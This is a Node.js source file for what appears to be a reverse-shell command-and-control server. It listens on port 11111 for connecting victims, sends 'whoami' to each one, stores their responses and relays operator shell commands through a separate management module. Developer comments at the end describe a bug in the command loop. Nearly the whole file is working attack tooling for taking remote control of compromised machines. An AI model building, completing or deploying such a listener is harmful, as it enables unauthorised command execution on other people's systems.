"use strict";
const net = require("net");
const manageServer = require("../manage_server.js");
const port = 11111;
const socketClients = require("./clients.js");
const server = net.createServer((client) => {
    client.on("error", (error) => {
        switch (error.code) {
            case "ECONNRESET":
                console.log("\[-] Client disconnected!");
                manageServer.getNumberOfClients(server);
                break;
            default:
                break;
        }
    });
});

server.listen({
   host : "0.0.0.0",
   port,
},() => {
    console.log(`Socket server listening at ${server.address().address}:${port}`);
    console.log("-------------------------------");
});

server.on("connection", (client) => {
    saveNewClient(client);

    // Response is saved by "data" event since it's the first request.
    client.write("whoami");

    manageServer.getNumberOfClients(server);
    manageServer.gotoMainMenu();

    client.on("data", async (data) =>  {
        try {
            const currentClient = await manageServer.getClientData(client);
            // Prevent newline being added to shell prompt.
            const clientResponse = data.toString().replace("\n", "");
            currentClient.responseHistory.push(clientResponse);
            currentClient.messageCount++;
            if (currentClient.messageCount <= 1) {
                setClientName(currentClient, clientResponse);

                return;
            } else {
                console.log(clientResponse);
            }
            manageServer.getAndSendSocketCommand(client);
        } catch (err) {
            console.error(`Could not save response from client ${client.remoteAddress}:${client.remotePort}`,err);
        }
    });
});

const saveNewClient = (client) => {
    const fullClientAddress = `${client.remoteAddress}:${client.remotePort}`;
    console.log(`[+] Connection receieved: ${fullClientAddress}`);
    socketClients.push({ address : `${fullClientAddress}`, client, messageCount : 0, name: "", responseHistory : [], uptime: 0 });    
}

const setClientName = (client, name) => {
    client.name = name;
}

module.exports = server;

// PROBLEM:
// ONCE WE SEND ONE COMMAND, WE DONT LOG THE RESPNOSE
// WE ALSO DONT GET PROMPTED TO SEND ANOTHER MESSAGE

// CHECK OUR CURRENT CLIENT - BUILD IN STATE
// IF WE GET A MESSAGE AND ITS FROM THE CURRENT CLIENT, PRINT RES